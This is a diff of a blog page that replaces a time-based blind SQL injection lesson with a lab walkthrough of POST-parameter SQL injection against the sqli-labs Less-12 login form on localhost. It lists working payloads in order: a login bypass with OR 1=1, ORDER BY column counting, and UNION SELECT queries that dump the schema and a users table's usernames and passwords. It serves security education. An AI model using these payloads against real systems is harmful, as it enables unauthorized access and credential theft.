@@ -59,11 +59,11 @@
 
 <!-- Open Graph image and Twitter Card metadata -->
 
-<title itemprop="name">r00tpunk - SQL Injection Lab – Lesson 4 (Blind injections - Time based)</title>
-<meta property="og:title" content=r00tpunk&#32;-&#32;SQL&#32;Injection&#32;Lab&#32;–&#32;Lesson&#32;4&#32;(Blind&#32;injections&#32;-&#32;Time&#32;based) />
-<meta name="twitter:title" content=r00tpunk&#32;-&#32;SQL&#32;Injection&#32;Lab&#32;–&#32;Lesson&#32;4&#32;(Blind&#32;injections&#32;-&#32;Time&#32;based) />
-<meta itemprop="name" content=r00tpunk&#32;-&#32;SQL&#32;Injection&#32;Lab&#32;–&#32;Lesson&#32;4&#32;(Blind&#32;injections&#32;-&#32;Time&#32;based) />
-<meta name="application-name" content=r00tpunk&#32;-&#32;SQL&#32;Injection&#32;Lab&#32;–&#32;Lesson&#32;4&#32;(Blind&#32;injections&#32;-&#32;Time&#32;based) />
+<title itemprop="name">r00tpunk - SQL Injection Lab – Lesson 5 (POST parameter injection -error based)</title>
+<meta property="og:title" content=r00tpunk&#32;-&#32;SQL&#32;Injection&#32;Lab&#32;–&#32;Lesson&#32;5&#32;(POST&#32;parameter&#32;injection&#32;-error&#32;based) />
+<meta name="twitter:title" content=r00tpunk&#32;-&#32;SQL&#32;Injection&#32;Lab&#32;–&#32;Lesson&#32;5&#32;(POST&#32;parameter&#32;injection&#32;-error&#32;based) />
+<meta itemprop="name" content=r00tpunk&#32;-&#32;SQL&#32;Injection&#32;Lab&#32;–&#32;Lesson&#32;5&#32;(POST&#32;parameter&#32;injection&#32;-error&#32;based) />
+<meta name="application-name" content=r00tpunk&#32;-&#32;SQL&#32;Injection&#32;Lab&#32;–&#32;Lesson&#32;5&#32;(POST&#32;parameter&#32;injection&#32;-error&#32;based) />
 <meta property="og:site_name" content="r00tpunk" />
 
 
@@ -73,14 +73,14 @@
 <meta name="twitter:description" content="" />
 
 
-<base href="https://r00tpunk.github.io/posts/learning/less4/" />
-<link rel="canonical" href="https://r00tpunk.github.io/posts/learning/less4/" itemprop="url" />
-<meta name="url" content="https://r00tpunk.github.io/posts/learning/less4/" />
-<meta name="twitter:url" content="https://r00tpunk.github.io/posts/learning/less4/" />
-<meta property="og:url" content="https://r00tpunk.github.io/posts/learning/less4/" />
+<base href="https://r00tpunk.github.io/posts/learning/less5/" />
+<link rel="canonical" href="https://r00tpunk.github.io/posts/learning/less5/" itemprop="url" />
+<meta name="url" content="https://r00tpunk.github.io/posts/learning/less5/" />
+<meta name="twitter:url" content="https://r00tpunk.github.io/posts/learning/less5/" />
+<meta property="og:url" content="https://r00tpunk.github.io/posts/learning/less5/" />
 
 
-<meta property="og:updated_time" content="2025-10-08T00:00:00Z" />
+<meta property="og:updated_time" content="2025-10-28T00:00:00Z" />
 
 
 <link rel="sitemap" type="application/xml" title="Sitemap" href='https://r00tpunk.github.io/sitemap.xml' />
@@ -365,15 +365,15 @@
                 <div class="post">
   <div class="info">
   <h1 class="post-title">
-    <a href="https://r00tpunk.github.io/posts/learning/less4/">SQL Injection Lab – Lesson 4 (Blind injections - Time based)</a>
+    <a href="https://r00tpunk.github.io/posts/learning/less5/">SQL Injection Lab – Lesson 5 (POST parameter injection -error based)</a>
   </h1>
 
   <div class="headline">
     <div>
       
       
-      <time datetime=" 2025-10-08T00:00:00Z" class="post-date">
-        October 8, 2025
+      <time datetime=" 2025-10-28T00:00:00Z" class="post-date">
+        October 28, 2025
       </time>
       
       <span> - </span>
@@ -382,7 +382,7 @@
           
         
 
-        <span>2 mins read</span>
+        <span>3 mins read</span>
       </span>
     </div>
 
@@ -415,55 +415,142 @@
   
 </div>
 
-  <h2 id="blind-injections--time-based">Blind injections -(Time based)</h2>
-<p>An injection technique where the attacker cannot see the query output directly; instead, they infer information through side‑effects such as time delays or content changes.</p>
+  <h2 id="post-parameter-injection--error-based">POST parameter injection -error based</h2>
+<p>POST-parameter error-based injection is when malicious input in an HTTP POST field deliberately triggers a database/application error that leaks internal info (SQL fragments, column/ table names, DB type/version) in responses or logs.</p>
 <h1 id="inject-parameter">Inject parameter</h1>
-<ol>
-<li>Look for parameters placed inside single quotes: <code>id='...</code></li>
-<li>Confirm the server shows delays or responds immediately.</li>
-<li>By measuring latency you can infer boolean results and enumerate the database.</li>
-</ol>
-<p>If the delay happen, parameter is injectable.</p>
-<h2 id="time-based-paylods-construction">Time-Based Paylods Construction</h2>
-<ol>
-<li>Identify injection point (e.g., a URL parameter that is quoted in the query).</li>
-<li>Close the original string with a single quote (&rsquo;).</li>
-<li>Insert the conditional payload using <em><strong>IF</strong></em>.</li>
-<li>Terminate the rest of the query with a comment (&ndash; ).</li>
-<li>Observe the response time to decide true/false.</li>
-</ol>
-<h1 id="query-will-be-like-this">Query will be like this</h1>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39; OR IF(SUBSTRING(DATABASE(),1,1)=&#39;</span>s<span style="color:#e6db74">&#39;, SLEEP(10), 0)-- 
-</span></span></span></code></pre></div><p>the query means: If the first character of the database name is s, the server sleeps 10s → true.</p>
-<p>Otherwise the response is immediate → false.</p>
-<h2 id="testing-paylods">Testing Paylods</h2>
+<p>So this is our test lab: <em><strong>http://localhost:8080/sqli-labs/sqli-labs-master/Less-12/</strong></em>.</p>
+<p>Now you see we have the login page with the input fields of <em><strong>Username</strong></em> and <em><strong>Password</strong></em>.</p>
+<h1 id="testing-queries">Testing queries</h1>
+<h2 id="now-lets-try-the-simple-login-which-is-admin-admin">Now let&rsquo;s try the simple login which is &ldquo;<em><strong>admin</strong></em>, <em><strong>admin</strong></em>&rdquo;.</h2>
+<p><img src="/sqli-05/ss1.jpg" alt="Alt text"></p>
 <ul>
-<li>For this I&rsquo;m using the this query to test <em><strong>true/false</strong></em>.</li>
-<li>If it&rsquo;s true the query will show <em><strong>delay in server</strong></em>.</li>
+<li>Boom as you can see we got logged in as <em><strong>admin</strong></em>.</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#f92672">?</span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39; and sleep(10)--+
-</span></span></span></code></pre></div><p><img src="/sqli-04/1.jpg" alt="Alt text"></p>
-<p>As you can see on the top left of the web page. The server is reloading it&rsquo;s mean the query is <em><strong>True</strong></em></p>
-<p>Now we can check the version and other things (character by character).</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#f92672">?</span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39; and if((select version()) like &#34;10%&#34;, sleep(10), null)--+
-</span></span></span></code></pre></div><p><img src="/sqli-04/2.jpg" alt="Alt text"></p>
-<p>As you can see the <em><strong>server reload</strong></em> on the <em><strong>Top Left</strong></em> of the webpage it&rsquo;s mean the payload is <em><strong>True</strong></em>.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#f92672">?</span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39; and  if((select substr(table_name,1,1) from information_schema.tables where table_schema=database()  limit 0,1)=&#39;</span>e<span style="color:#e6db74">&#39;, sleep(10), null)--+
-</span></span></span></code></pre></div><p><img src="/sqli-04/3.jpg" alt="Alt text"></p>
-<p>As you can see our result is <em><strong>True</strong></em> you can see the reload on <em><strong>Top Left</strong></em>.</p>
+<h2 id="now-try-something-else-to-break-the-query">Now try something else to break the query.</h2>
+<ul>
+<li>Now we are trying <em><strong>&rsquo;</strong></em> to check if it&rsquo;s pass or not.</li>
+</ul>
+<p><img src="/sqli-05/ss2.jpg" alt="Alt text"></p>
+<ul>
+<li>It&rsquo;s seems like <em><strong>&rsquo;</strong></em> this got bypass.</li>
+</ul>
+<h2 id="now-lets-try--to-see-if-this-break-the-querry-or-not">Now let&rsquo;s try <em><strong>&quot;</strong></em> to see if this break the querry or not.</h2>
+<p><img src="/sqli-05/ss3.jpg" alt="Alt text"></p>
+<ul>
+<li>Here you go as we can see our query got broke we got an error.</li>
+</ul>
+<h2 id="fixing-this-query">Fixing this query.</h2>
+<ul>
+<li>Here&rsquo;s the key point we are using <em><strong>#</strong></em> in this lab because <em><strong>#</strong></em> is simple and reliable; &ndash; requires a space after it (in URLs &ndash;+ is used because + decodes to a space), so # often works better in labs.</li>
+</ul>
+<p>Now try to fix the query with this payload &ldquo;) # .
+<img src="/sqli-05/ss4.jpg" alt="Alt text"></p>
+<p>As you can see our payload is working.</p>
+<h2 id="now-lets-try-something-more-cool-to-dump-from-the-database">Now let&rsquo;s try something more cool to dump from the database.</h2>
+<p>We are trying thi Payload:</p>
+<p>&ldquo;) or 1=1 #</p>
+<p>to see if its true or false.</p>
+<ul>
+<li>If this works it&rsquo;s mean we can execute more queries and will be able to dump.</li>
+</ul>
+<p><img src="/sqli-05/ss5.jpg" alt="Alt text"></p>
+<p>Now as we can see we got logged in with the username <em><strong>Dumb</strong></em> and password <em><strong>Dumb</strong></em>.</p>
+<h2 id="now-its-time-to-check-the-columns-by-using-order-by-">Now its time to check the columns by using order by .</h2>
+<p>Payload:</p>
+<p>&ldquo;) order by 1 #</p>
+<p><img src="/sqli-05/ss6.jpg" alt="Alt text"></p>
+<ul>
+<li>This is working, it&rsquo;s mean we have column no 1</li>
+</ul>
+<p><em><strong>Lets try more</strong></em></p>
+<p>Payload:</p>
+<p>&ldquo;) order by 2 #</p>
+<p><img src="/sqli-05/ss7.jpg" alt="Alt text"></p>
+<ul>
+<li>This is also working mean we got column no 2</li>
+</ul>
+<p>Payload:</p>
+<p>&ldquo;) order by 3 #</p>
+<p><img src="/sqli-05/ss8.jpg" alt="Alt text"></p>
+<ul>
+<li>Now as you can see we get an error, it&rsquo;s mean we only have 2 columns.</li>
+</ul>
+<h2 id="now-alterate-it-more-to-get">Now alterate it more to get.</h2>
+<p>I used this payload:</p>
+<p>&ldquo;) union select 1,2 #</p>
+<p><img src="/sqli-05/ss9.jpg" alt="Alt text"></p>
+<ul>
+<li>And you can see we got the same <em><strong>1 2</strong></em> on username and password.</li>
+</ul>
+<h1 id="now-try-to-get-database-name-and-version">Now try to get Database name and version</h1>
+<p>For this we will use this payload:</p>
+<p>&ldquo;) union select version(),database() #</p>
+<p><img src="/sqli-05/ss10.jpg" alt="Alt text"></p>
+<ul>
+<li>As you can see the <em><strong>mysql Version</strong></em> and the <em><strong>Name of the Database</strong></em> on your screen.</li>
+</ul>
+<h2 id="lets-enumerate-it-further">Let&rsquo;s enumerate it further</h2>
+<p>We are going to use this payload:</p>
+<p>&ldquo;) union select 1, table_name from information_schema.tables where table_schema=&lsquo;security&rsquo; #</p>
+<p><img src="/sqli-05/ss11.jpg" alt="Alt text"></p>
+<ul>
+<li>And now we got our first table name.</li>
+</ul>
+<h1 id="and-we-can-use-limit-function-to-enumerate-more">And we can use LIMIT function to enumerate more.</h1>
+<p>Payload:</p>
+<p>&ldquo;) union select 1, table_name from information_schema.tables where table_schema=&lsquo;security&rsquo; LIMIT 1,1 #</p>
+<p><img src="/sqli-05/ss12.jpg" alt="Alt text"></p>
+<ul>
+<li>We got refers.</li>
+</ul>
+<p>Payload:</p>
+<p>&ldquo;) union select 1, table_name from information_schema.tables where table_schema=&lsquo;security&rsquo; LIMIT 2,1 #</p>
+<p><img src="/sqli-05/ss13.jpg" alt="Alt text"></p>
+<ul>
+<li>We got uagents.</li>
+</ul>
+<p>Payload:</p>
+<p>&ldquo;) union select 1, table_name from information_schema.tables where table_schema=&lsquo;security&rsquo; LIMIT 3,1 #</p>
+<p><img src="/sqli-05/ss14.jpg" alt="Alt text"></p>
+<ul>
+<li>We got users.</li>
+</ul>
+<p>Payload:</p>
+<p>&ldquo;) union select 1, table_name from information_schema.tables where table_schema=&lsquo;security&rsquo; LIMIT 4,1 #</p>
+<p><img src="/sqli-05/ss15.jpg" alt="Alt text"></p>
+<ul>
+<li>We got nothing, so it&rsquo;s mean we got 3 tables.</li>
+</ul>
+<h2 id="and-now-you-can-enumerate-it-more-to-dump-more">And now you can enumerate it more to dump more.</h2>
+<ol>
+<li>Basic Database Structure Dump:</li>
+</ol>
+<p>&ldquo;) union select 1,(SELECT GROUP_CONCAT(table_name, &lsquo;:&rsquo;, column_name) FROM information_schema.columns WHERE table_schema=database()) #</p>
+<p><img src="/sqli-05/dios1.jpg" alt="Alt text"></p>
+<ol start="2">
+<li>Table Names Only:</li>
+</ol>
+<p>&ldquo;) union select 1,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()) #</p>
+<p><img src="/sqli-05/dios2.jpg" alt="Alt text"></p>
+<ol start="3">
+<li><em><strong>Users</strong></em> Table Data Dump:</li>
+</ol>
+<p>&ldquo;) union select 1,(SELECT GROUP_CONCAT(username, &lsquo;:&rsquo;, password) FROM users) #</p>
+<p><img src="/sqli-05/dios3.jpg" alt="Alt text"></p>
+<ol start="4">
+<li>Complete Database Info:</li>
+</ol>
+<p>&ldquo;) union select 1,CONCAT(&lsquo;DB:&rsquo;,database(),&rsquo; | User:&rsquo;,user(),&rsquo; | Tables:&rsquo;,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database())) #</p>
+<p><img src="/sqli-05/dios4.jpg" alt="Alt text"></p>
 
   
   <hr>
 <div class="footer">
     
 	    
-            <a class="previous-post" href="https://r00tpunk.github.io/posts/learning/less3/?ref=footer"><span style="font-weight:bold;">« Previous</span><br>SQL Injection Lab – Lesson 3 (Blind injections -...</a>
+            <a class="previous-post" href="https://r00tpunk.github.io/posts/learning/less4/?ref=footer"><span style="font-weight:bold;">« Previous</span><br>SQL Injection Lab – Lesson 4 (Blind injections -...</a>
         
 	    
-            <div class="next-post">
-                <a href="https://r00tpunk.github.io/posts/learning/less5/?ref=footer"><span style="font-weight:bold;">Next »</span><br>SQL Injection Lab – Lesson 5 (POST parameter...</a>
-            </div>
-        
     
 </div>
 
@@ -477,15 +564,25 @@
       <h4 id="contents"></h4>
       <nav id="TableOfContents">
   <ul>
-    <li><a href="#blind-injections--time-based">Blind injections -(Time based)</a></li>
+    <li><a href="#post-parameter-injection--error-based">POST parameter injection -error based</a></li>
   </ul>
 
   <ul>
-    <li><a href="#time-based-paylods-construction">Time-Based Paylods Construction</a></li>
+    <li><a href="#now-lets-try-the-simple-login-which-is-admin-admin">Now let&rsquo;s try the simple login which is &ldquo;<em><strong>admin</strong></em>, <em><strong>admin</strong></em>&rdquo;.</a></li>
+    <li><a href="#now-try-something-else-to-break-the-query">Now try something else to break the query.</a></li>
+    <li><a href="#now-lets-try--to-see-if-this-break-the-querry-or-not">Now let&rsquo;s try <em><strong>&quot;</strong></em> to see if this break the querry or not.</a></li>
+    <li><a href="#fixing-this-query">Fixing this query.</a></li>
+    <li><a href="#now-lets-try-something-more-cool-to-dump-from-the-database">Now let&rsquo;s try something more cool to dump from the database.</a></li>
+    <li><a href="#now-its-time-to-check-the-columns-by-using-order-by-">Now its time to check the columns by using order by .</a></li>
+    <li><a href="#now-alterate-it-more-to-get">Now alterate it more to get.</a></li>
   </ul>
 
   <ul>
-    <li><a href="#testing-paylods">Testing Paylods</a></li>
+    <li><a href="#lets-enumerate-it-further">Let&rsquo;s enumerate it further</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#and-now-you-can-enumerate-it-more-to-dump-more">And now you can enumerate it more to dump more.</a></li>
   </ul>
 </nav>
     </div>
